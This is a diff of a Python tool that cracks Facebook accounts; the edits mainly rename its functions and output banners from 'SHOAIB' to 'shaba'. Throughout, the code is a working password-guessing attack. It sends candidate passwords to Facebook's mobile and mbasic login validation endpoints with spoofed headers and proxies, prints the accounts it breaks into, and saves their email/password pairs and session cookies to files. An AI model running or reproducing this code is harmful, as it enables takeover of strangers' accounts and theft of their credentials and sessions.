@@ -473,7 +473,7 @@ def passwrd():
 		time.sleep(2)
 		exit()
 #--------------------[ METODE-B-API ]-----------------#
-def crackmobile_SHOAIB(idf,pwv,nmf):
+def crackmobile_shaba(idf,pwv,nmf):
 	global loop,ok,cp
 	bi = random.choice(['\33[m'])
 	pers = loop*100/len(id2)
@@ -547,7 +547,7 @@ def crackmobile_SHOAIB(idf,pwv,nmf):
 			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{N}╭───[SHOAIB-CP]\n└──╭➣ EMAIL: {k}{idf}{N}\n └──╭➣ PASSWORD: {k}{pw}{N}\n   └───➣{m} {ua}{N}\n')
+				print(f'\r{N}╭───[shaba-CP]\n└──╭➣ EMAIL: {k}{idf}{N}\n └──╭➣ PASSWORD: {k}{pw}{N}\n   └───➣{m} {ua}{N}\n')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -556,9 +556,9 @@ def crackmobile_SHOAIB(idf,pwv,nmf):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{N}╭───[SHOAIB-OK]\n└──╭➣ EMAIL:  {H}{idf}{N}\n  └──╭➣ PASSWORD:  {H}{pw}{N}\n  └──╭➣ Cokkie: {H}{kuki} ')
+				print(f'\r{N}╭───[shaba-OK]\n└──╭➣ EMAIL:  {H}{idf}{N}\n  └──╭➣ PASSWORD:  {H}{pw}{N}\n  └──╭➣ Cokkie: {H}{kuki} ')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
-				cek_SHOAIB(kuki)
+				cek_shaba(kuki)
 				break
 				
 			else:
@@ -567,7 +567,7 @@ def crackmobile_SHOAIB(idf,pwv,nmf):
 			time.sleep(31)
 	loop+=1
 #----------------------[ METHODE-MTOUCH+MOBILE-4 ]-----------------#
-def crackmbasic_SHOAIB(idf,pwv,nmf):
+def crackmbasic_shaba(idf,pwv,nmf):
 	global loop,ok,cp
 	bi = random.choice(['\33[m'])
 	pers = loop*100/len(id2)
@@ -641,7 +641,7 @@ def crackmbasic_SHOAIB(idf,pwv,nmf):
 			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{N}╭───[SHOAIB-CP]\n└──╭➣ EMAIL: {k}{idf}{N}\n └──╭➣ PASSWORD: {k}{pw}{N}\n   └───➣{m} {ua}{N}\n')
+				print(f'\r{N}╭───[shaba-CP]\n└──╭➣ EMAIL: {k}{idf}{N}\n └──╭➣ PASSWORD: {k}{pw}{N}\n   └───➣{m} {ua}{N}\n')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -652,7 +652,7 @@ def crackmbasic_SHOAIB(idf,pwv,nmf):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r{N}╭───[SHOAIB-OK]\n└──╭➣ EMAIL:  {H}{idf}{N}\n  └──╭➣ PASSWORD:  {H}{pw}{N}\n  └──╭➣ Cokkie: {H}{kuki} ')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
-				cek_SHOAIB(kuki)
+				cek_shaba(kuki)
 				break
 				
 			else:
